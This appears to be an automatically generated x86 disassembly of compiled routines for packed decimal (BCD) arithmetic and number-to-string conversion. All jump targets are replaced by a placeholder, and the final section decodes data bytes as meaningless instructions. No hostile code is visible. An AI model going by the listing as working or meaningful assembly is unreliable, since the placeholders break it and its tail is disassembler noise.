mov ebp esp
push ecx
push esi
push edi
push ebx
push ecx
push edx
mov cx [ ebp + 0x8 ]
mov dh 0x0
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x2 ] 0x0
mov cx [ ebp + 0x8 ]
add edi 0x1
add esi 0x1
add ebx 0x1
sub cx 0x1
cmp cx 0x2
jne r-xdata
pop edx
pop ecx
pop ebx
pop edi
pop esi
pop ecx
pop ebp
retn 0x10
cmp [ ebp - 0x2 ] 0x1
jne r-xdata
sub cx 0x1
jmp r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
mov al [ esi ]
mov ah [ ebx ]
and al 0xf
and ah 0xf
mov dl ah
add dl al
call sub_46d510
mov ah dl
sub cx 0x1
cmp cx 0x0
je r-xdata
mov ah 0x0
mov [ ebp - 0x2 ] 0x0
jmp r-xdata
cmp cx 0x2
jbe r-xdata
mov dl 0x0
or dl ah
mov [ edi ] dl
mov al [ esi ]
mov dl [ ebx ]
shr al 0x4
shr dl 0x4
add dl al
call sub_46d510
shl dl 0x4
or dl ah
mov [ edi ] dl
sub edi 0x1
sub esi 0x1
sub ebx 0x1
sub cx 0x1
jmp r-xdata
cmp cx 0x0
je r-xdata
sub_46dad0
push ebp
mov ebp esp
push ecx
push esi
push edi
push ebx
push edx
mov cx [ ebp + 0xc ]
mov dx [ ebp + 0x8 ]
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x4 ] 0x0
cld
cmp dx 0x0
jle r-xdata
lodsb [ esi ]
mov ah [ edi ]
inc edi
cmp al ah
jne r-xdata
pop edx
pop ebx
pop edi
pop esi
mov eax [ ebp - 0x4 ]
pop ecx
pop ebp
retn 0x10
mov ah [ edi ]
inc edi
sub dx 0x2
cmp ah 0x0
je r-xdata
mov bl ah
mov ah al
shr ah 0x4
mov bh bl
shr bh 0x4
cmp bh ah
jne r-xdata
sub cx 0x1
sub dx 0x1
cmp cx 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
cmp bh ah
ja r-xdata
cmp cx 0x0
je r-xdata
sub cx 0x1
sub dx 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov ah al
mov bh bl
and ah 0xf
and bh 0xf
cmp cx 0x0
je r-xdata
sub_46db84
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov esi eax
xor edi edi
mov ebp edx
mov eax [ esi ]
mov dl [ eax ]
jmp r-xdata
xor eax eax
mov al [ esp ]
cmp edi eax
jl r-xdata
mov al [ ebp ]
and dl 0xf
shl edx 0x4
xor ecx ecx
mov cl al
shr ecx 0x4
or dl cl
mov ecx [ esi ]
mov [ ecx ] dl
mov edx eax
inc [ esi ]
inc ebp
add edi 0x2
pop edx
pop ebp
pop edi
pop esi
retn
sub_46dbc4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cx
mov esi edx
mov edi eax
mov [ ebp - 0x3 ] 0x1
xor eax eax
mov al [ edi ]
cmp ax [ ebp - 0x2 ]
jne r-xdata
mov al [ edi + 0x1 ]
test al 0x80
setne [ ebp - 0xb ]
and al 0x3f
and eax 0xff
mov [ ebp - 0xa ] ax
mov al [ ebp - 0x2 ]
mov [ esi ] al
mov al [ ebp + 0x8 ]
mov [ esi + 0x1 ] al
lea eax [ edi + 0x2 ]
mov [ ebp - 0x8 ] eax
lea ebx [ esi + 0x2 ]
mov eax ebx
xor ecx ecx
mov edx 0x20
call sub_402c40
xor eax eax
mov al [ edi ]
cmp ax [ ebp - 0x2 ]
jbe r-xdata
mov al [ edi + 0x1 ]
and al 0x3f
and eax 0xff
cmp ax [ ebp + 0x8 ]
jne r-xdata
mov edx [ ebp - 0x8 ]
push edx
mov al [ ebp - 0xa ]
mov dl [ edi ]
sub dl al
push edx
push eax
mov al [ ebp - 0x2 ]
mov dl [ ebp + 0x8 ]
and dl 0x3f
sub al dl
push eax
mov al [ ebp + 0x8 ]
and al 0x3f
push eax
push ebx
call sub_46d578
cmp [ ebp - 0xb ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
xor eax eax
mov al [ edi ]
push eax
call sub_46d91c
cmp ax [ ebp - 0x2 ]
jbe r-xdata
push esi
mov eax edi
mov edi esi
mov esi eax
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
pop esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
xor edx edx
mov dl [ esi ]
mov eax edx
shr eax 0x1
and edx 0x1
cmp edx 0x1
jne r-xdata
test [ esi + 0x1 ] 0x80
jne r-xdata
mov [ ebp - 0x3 ] 0x0
jmp r-xdata
movsx eax ax
cmp eax 0x1f
jg r-xdata
inc eax
mov al [ esi + 0x1 ]
call sub_46db78
mov [ esi + 0x1 ] al
mov al [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov [ ebx + eax ] 0x0
inc eax
cmp eax 0x20
jne r-xdata
sub_46dcf0
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov edi edx
mov esi eax
mov al [ esi ]
xor edx edx
mov dl al
cmp edi edx
jl r-xdata
mov [ ebx ] al
mov al [ esi + 0x1 ]
mov [ ebx + 0x1 ] al
lea ebp [ ebx + 0x2 ]
mov eax ebp
xor ecx ecx
mov edx 0x20
call sub_402c40
lea eax [ esi + 0x2 ]
mov esi eax
jmp r-xdata
mov edi ebx
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
jmp r-xdata
xor eax eax
mov al [ ebx ]
cmp edi eax
jge r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_46e7b8
movzx eax ax
xor edx edx
mov dl [ ebx ]
add eax edx
add eax 0x2
shr eax 0x1
cmp eax 0x20
jle r-xdata
cmp [ esi ] 0x0
je r-xdata
mov edx ebp
mov ecx esi
xchg ecx eax
call sub_402998
mov eax 0x20
sub [ ebx ] 0x2
inc esi
sub_46dd70
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x26 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov ebx edx
mov edi ebx
lea esi [ ebp - 0x26 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
xor eax eax
mov al [ ebp - 0x26 ]
and eax 0x1
test eax eax
je r-xdata
lea eax [ ebx + 0x2 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov al [ ebx ]
shr eax 0x1
cmp eax 0x1f
jg r-xdata
lea eax [ ebp - 0x24 ]
lea edx [ ebx + 0x2 ]
mov [ ebp - 0x4 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx ] 0x0
mov dl [ ebp - 0x26 ]
inc edx
mov [ ebx ] dl
lea edx [ ebp - 0x4 ]
mov cl [ ebp - 0x26 ]
xchg edx eax
call sub_46db84
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov [ edx + eax ] 0x0
inc eax
cmp eax 0x20
jne r-xdata
sub_46ddec
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
lea edx [ ebp - 0x26 ]
mov eax ebx
call sub_46dd70
lea edx [ ebp - 0x48 ]
mov eax esi
call sub_46dd70
cmp [ ebp - 0x26 ] 0x20
ja r-xdata
mov eax esi
call sub_46dcd4
push eax
mov eax ebx
call sub_46dcd4
pop edx
call sub_42b030
mov ebx eax
xor eax eax
mov al [ ebp - 0x26 ]
cmp bx ax
jae r-xdata
cmp [ ebp - 0x48 ] 0x20
jbe r-xdata
xor eax eax
mov al [ ebp - 0x48 ]
cmp bx ax
jae r-xdata
mov ebx eax
xor edx edx
mov dl [ ebp - 0x48 ]
xor eax eax
mov al [ ebp - 0x26 ]
call sub_42b030
mov ebx eax
lea eax [ ebp - 0x48 ]
call sub_46e7b8
movzx eax ax
push eax
lea eax [ ebp - 0x26 ]
call sub_46e7b8
movzx eax ax
pop edx
call sub_42b030
mov esi eax
jmp r-xdata
lea ecx [ ebp - 0x6c ]
movzx esi bx
mov edx esi
lea eax [ ebp - 0x26 ]
call sub_46dcf0
push esi
lea esi [ ebp - 0x6c ]
lea edi [ ebp - 0x26 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x6c ]
mov edx esi
lea eax [ ebp - 0x48 ]
call sub_46dcf0
lea esi [ ebp - 0x6c ]
lea edi [ ebp - 0x48 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov ebx eax
cmp bx 0x40
jae r-xdata
push esi
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x26 ]
mov ecx ebx
call sub_46dbc4
push esi
mov edx [ ebp + 0xc ]
lea eax [ ebp - 0x48 ]
mov ecx ebx
call sub_46dbc4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x26 ]
call sub_46e7b8
movzx eax ax
xor edx edx
mov dl [ ebp - 0x26 ]
sub edx eax
movzx edi bx
movzx eax si
sub edi eax
cmp edx edi
jg r-xdata
add bx 0x2
lea eax [ ebp - 0x48 ]
call sub_46e7b8
movzx eax ax
xor edx edx
mov dl [ ebp - 0x48 ]
sub edx eax
cmp edi edx
jl r-xdata
sub_46df20
push ebx
push esi
push edi
push ebp
add esp 0xffffffb8
mov esi edx
mov edi eax
mov al [ edi + 0x1 ]
and al 0x80
mov dl [ esi + 0x1 ]
and dl 0x80
cmp al dl
je r-xdata
test al al
setne [ esp + 0x1 ]
lea ebp [ edi + 0x2 ]
lea ebx [ esi + 0x2 ]
push ebp
mov al [ edi + 0x1 ]
and al 0x3f
and eax 0xff
xor edx edx
mov dl [ edi ]
sub dx ax
push edx
call sub_46d91c
mov [ esp ] al
push ebx
mov al [ esi + 0x1 ]
and al 0x3f
and eax 0xff
xor edx edx
mov dl [ esi ]
sub dx ax
push edx
call sub_46d91c
cmp al [ esp ]
je r-xdata
test al al
je r-xdata
lea eax [ esp + 0x24 ]
push eax
push 0x0
lea ecx [ esp + 0xa ]
mov edx esi
mov eax edi
call sub_46ddec
lea ebp [ esp + 0x4 ]
lea ebx [ esp + 0x26 ]
push ebp
push ebx
xor eax eax
mov al [ esp + 0xa ]
push eax
xor eax eax
mov al [ esp + 0x30 ]
push eax
call sub_46dad0
cmp al [ esp ]
jge r-xdata
mov eax 0x1
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
add esp 0x48
pop ebp
pop edi
pop esi
pop ebx
retn
neg eax
or eax 0xffffffff
jmp r-xdata
mov eax 0x1
jmp r-xdata
cmp [ esp + 0x1 ] 0x0
je r-xdata
sub_46dfe8
push ebx
push esi
push edi
add esp 0xffffffdc
mov esi ecx
mov ebx eax
push esi
mov esi edx
lea edi [ esp + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
pop esi
mov al [ esp + 0x1 ]
call sub_46db78
mov [ esp + 0x1 ] al
mov ecx esi
mov edx esp
mov eax ebx
call sub_46e344
add esp 0x24
pop edi
pop esi
pop ebx
retn
sub_46e024
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4044b8
mov eax [ ebp - 0x8 ]
call sub_4044b8
xor eax eax
push ebp
push sub_46e10d
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_4044c8
cmp [ eax ] 0x2d
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_4044c8
cmp [ eax ] 0x2d
jne r-xdata
inc ebx
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4042c8
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_404528
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_46cd14
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
call sub_46bea4
push esi
mov edi esi
lea esi [ ebp - 0x30 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
pop esi
and ebx 0x80000001
jns r-xdata
inc ebx
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4042c8
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x8 ]
call sub_404528
test ebx ebx
je r-xdata
dec ebx
or ebx 0xfffffffe
inc ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e114
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_40402c
retn
mov al [ esi + 0x1 ]
and al 0x3f
or al 0x80
mov [ esi + 0x1 ] al
sub_46e11c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46e178
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_46e674
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_46e674
mov eax [ ebp - 0x8 ]
mov ecx edi
pop edx
call sub_46e024
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e17f
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
sub_46e188
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4044b8
mov eax [ ebp - 0x8 ]
call sub_4044b8
xor eax eax
push ebp
push sub_46e2be
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404414
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405efc
mov eax [ ebp - 0x10 ]
call sub_46b660
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4044c8
cmp [ eax ] 0x2d
jne r-xdata
mov bl 0xa
xor edi edi
mov bl [ esi + 0x1 ]
and bl 0x3f
test bl bl
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_4044c8
cmp [ eax ] 0x2d
jne r-xdata
inc edi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4042c8
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_404528
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_46d3f4
mov eax [ ebp - 0x14 ]
lea ecx [ ebp - 0xc ]
xor edx edx
mov dl bl
call sub_46bf58
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0xc ]
call sub_46bea4
push esi
push edi
mov edi esi
lea esi [ ebp - 0x38 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
pop edi
pop esi
and edi 0x80000001
jns r-xdata
inc edi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4042c8
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x8 ]
call sub_404528
test edi edi
je r-xdata
dec edi
or edi 0xfffffffe
inc edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e2c5
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_40402c
retn
mov al [ esi + 0x1 ]
and al 0x3f
or al 0x80
mov [ esi + 0x1 ] al
sub_46e2d8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46e334
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_46e674
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_46e674
mov eax [ ebp - 0x8 ]
mov ecx edi
pop edx
call sub_46e188
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e33b
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
sub_46e344
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov esi ecx
mov [ esp ] edx
mov ebx eax
lea eax [ esp + 0x2f ]
push eax
push 0x1
lea ecx [ esp + 0x15 ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_46ddec
movzx ebp [ esp + 0xd ]
movzx edi [ esp + 0xe ]
test [ ebx + 0x1 ] 0x80
setne al
mov ebx eax
mov eax [ esp ]
test [ eax + 0x1 ] 0x80
setne [ esp + 0xc ]
mov eax ebp
mov [ esi ] al
cmp bl [ esp + 0xc ]
je r-xdata
mov eax edi
mov [ esi + 0x1 ] al
jmp r-xdata
mov al [ esp + 0xe ]
and al 0x3f
mov dl [ esp + 0x30 ]
and dl 0x3f
cmp al dl
jb r-xdata
lea eax [ esp + 0xf ]
mov [ esp + 0x4 ] eax
lea eax [ esp + 0x31 ]
mov [ esp + 0x8 ] eax
lea edi [ esi + 0x2 ]
mov eax edi
xor ecx ecx
mov edx 0x20
call sub_402c40
cmp bl [ esp + 0xc ]
jne r-xdata
mov eax edi
call sub_46db78
mov [ esi + 0x1 ] al
mov eax [ esp + 0x4 ]
push eax
push ebp
call sub_46d91c
movzx ebx ax
mov eax [ esp + 0x8 ]
push eax
push ebp
call sub_46d91c
movzx eax ax
cmp eax ebx
jge r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0xc ]
push eax
push edi
push ebp
call sub_46da18
jmp r-xdata
cmp ebx eax
jge r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0xc ]
push eax
push edi
push ebp
call sub_46d960
jmp r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0xc ]
push eax
push ebp
push ebp
call sub_46dad0
test eax eax
jl r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
push edi
push ebp
call sub_46d960
mov al [ esi + 0x1 ]
call sub_46db78
mov [ esi + 0x1 ] al
jmp r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
push edi
push ebp
call sub_46d960
mov al [ esi + 0x1 ]
call sub_46db78
mov [ esi + 0x1 ] al
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0xc ]
push eax
push edi
push ebp
call sub_46d960
jmp r-xdata
sub_46e4b0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
movsx edx [ edx - 0x9 ]
cmp eax edx
je r-xdata
test bl bl
ja r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebx + 0x30 ]
call sub_46e494
pop ecx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x11 ]
call sub_46e494
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov al 0x30
call sub_46e494
pop ecx
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
pop ebx
pop ebp
retn
sub_46e52c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x14 ] dx
mov edi eax
movsx eax [ ebp - 0x14 ]
add eax 0x3
call sub_407f70
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_46e61b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov al [ eax ]
mov [ ebp - 0x11 ] al
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor ebx ebx
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
movsx esi [ ebp - 0x14 ]
cmp esi [ ebp - 0x10 ]
jg r-xdata
push ebp
xor eax eax
mov al [ edi + ebx ]
shr eax 0x4
call sub_46e4b0
pop ecx
cmp esi [ ebp - 0x10 ]
jle r-xdata
jmp r-xdata
inc ebx
push ebp
mov al [ edi + ebx ]
and al 0xf
call sub_46e4b0
pop ecx
cmp [ ebp - 0x9 ] 0x0
jle r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
mov al [ eax + edx - 0x1 ]
cmp al [ ebp - 0x11 ]
jne r-xdata
movsx eax [ ebp - 0x9 ]
cmp eax [ ebp - 0x10 ]
jge r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax + edx ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
call sub_4040f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e622
movsx edx [ ebp - 0x14 ]
add edx 0x2
mov eax [ ebp - 0x18 ]
call sub_4027bc
retn
dec [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0x1
jg r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
cmp [ eax + edx - 0x1 ] 0x30
jne r-xdata
dec [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax + edx ] 0x0
sub_46e622
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx r-xdata
call sub_40405c
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx ]
mov eax [ ebp + 0x8 ]
mov edx r-xdata
call sub_404314
sub_46e674
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_46e773
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx ]
test al al
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405efc
mov eax [ ebp - 0x10 ]
call sub_46b678
jmp r-xdata
cmp al 0x40
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e77a
lea eax [ ebp - 0x10 ]
call sub_404008
retn
mov dl [ ebx + 0x1 ]
test dl 0x80
setne [ ebp - 0x9 ]
mov esi eax
and esi 0xff
lea eax [ ebx + 0x2 ]
mov [ ebp - 0x8 ] eax
and dl 0x3f
test dl dl
jbe r-xdata
mov edi esi
inc edi
mov eax esi
mov dl [ ebx + 0x1 ]
and dl 0x3f
sub al dl
movsx edi al
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov edx r-xdata
call sub_404414
je r-xdata
sub al 0x3
jne r-xdata
mov al [ ebp - 0x9 ]
push eax
mov al [ ebx + 0x1 ]
and al 0x3f
and eax 0xff
cmp esi eax
sete al
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_46e52c
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x2d
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40405c
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov edx r-xdata
call sub_404414
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov edx r-xdata
call sub_404414
jne r-xdata
sub_46e7c4
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi eax
xchg edx ecx
mov [ esi ] cl
mov [ esi + 0x1 ] dl
sub edx 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
or ebx ebx
jns r-xdata
ja r-xdata
mov edi 0xa
neg ebx
neg eax
sbb ebx 0x0
or [ esi + 0x1 ] 0x80
dec ecx
mov [ ecx + ebp - 0x40 ] 0x0
dec edx
jne r-xdata
fild [ ebp + 0x8 ]
fdiv [ edx * 4 + rw-data ]
fistp [ ebp + 0x8 ]
jmp r-xdata
mov [ ecx + ebp - 0x41 ] dl
dec ecx
jne r-xdata
xor edx edx
or ebx ebx
je r-xdata
mov edx eax
or edx ebx
je r-xdata
or eax ebx
mov al 0x0
jne r-xdata
div edi
xchg ebx eax
div edi
xchg ebx eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov cl [ esi ]
inc ecx
shr ecx 0x1
mov ax [ ebp + ecx * 2 - 0x42 ]
shl al 0x4
or al ah
mov [ esi + ecx + 0x1 ] al
dec ecx
jne r-xdata
mov al 0x1
sub_46e850
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push edi
push esi
xor ebx ebx
mov edi eax
mov esi edx
mov al 0x0
movzx edx [ edi ]
or edx edx
je r-xdata
pop esi
pop edi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x1 ]
shr ecx 0x1
mov al [ edi + ecx + 0x1 ]
mov ah al
shr al 0x4
and ah 0xf
mov [ ebp + ecx * 2 - 0x42 ] ax
dec ecx
jne r-xdata
xor eax eax
mov [ ebp - 0x44 ] eax
fild [ ebp - 0x44 ]
inc ecx
cmp ecx edx
jne r-xdata
mov al [ edi + 0x1 ]
or al al
jns r-xdata
fmul [ ebx + rw-data ]
mov al [ ecx + ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
fiadd [ ebp - 0x44 ]
jmp r-xdata
mov al [ ecx + ebp - 0x40 ]
or al al
jne r-xdata
fldz
jmp r-xdata
and eax 0x3f
sub eax 0x4
neg eax
call j_sub_402d80
fchs
inc ecx
cmp ecx edx
je r-xdata
fwait
fnstcw [ ebp - 0x46 ]
fldcw [ ebx + rw-data ]
fistp [ esi ]
fwait
fnstsw ax
not al
and al 0x1
fwait
fnclex
fldcw [ ebp - 0x46 ]
fwait
sub_46e8e8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46e919
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e920
retn
mov eax rw-data
call sub_40d524
sub_46ebe3
add [ edi ] cl
or cl [ ecx + 0x44 ]
inc edx
push ebx
jae r-xdata
add al 0xe8
jmp sub_405b0c
imul ebp [ edi + 0x6e ] r-xdata
add ebx edi
dec eax
and al 0xcc
jb r-xdata
add [ eax ] al
add bh bh
mov [ 0x77f7934b ] al

sub_46ec0b
dec esp
add eax 0xffffffec
jmp r-xdata
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
call sub_40405c
pop esi
pop ebx
retn
sub_46ec72
and eax 0x2f0046ec
in al dx
inc esi
add [ ecx ] bh
in al dx
inc esi
add [ 0x150046ec ] cl
in al dx
inc esi
add [ 0x530046ec ] bl
in al dx
inc esi
add [ ebp - 0x14 ] bl
inc esi
add [ edi - 0x14 ] ah
inc esi
add [ ebx - 0x14 ] al
inc esi
add [ ebx - 0x14 ] cl
inc esi
add [ edx ] al
add [ eax ] al
add [ esi - 0x21 ] dh
mov al [ 0xffffffffaaec6afa ]
dec eax
xchg edi eax
push esp
sub eax 0x5c81df36
or eax sub_46ec72
adc al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
or ch al
mov eax [ 0xffffffffcd6adc29 ]
inc esp
mov dh bl
dec edi
push ecx
mov dl 0x5d
pop ecx
xchg ebp eax
mov ch ah
inc esi
add [ eax ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x46ed28c0 ] cl
add [ esi + 0x46ec ] bl
add [ eax ] al
add [ eax ] ch
in eax dx
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] bh
in eax dx
inc esi
add [ eax + eax ] bl
add [ eax ] al
sub al 0x12
inc eax
add [ esp + esi + 0x40 ] bh
add [ eax - 0x3bffbfa6 ] bh
pop edx
inc eax
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah dl
pop edx
inc eax
add al ch
xor [ eax ] eax
and al 0x32
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah cl
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
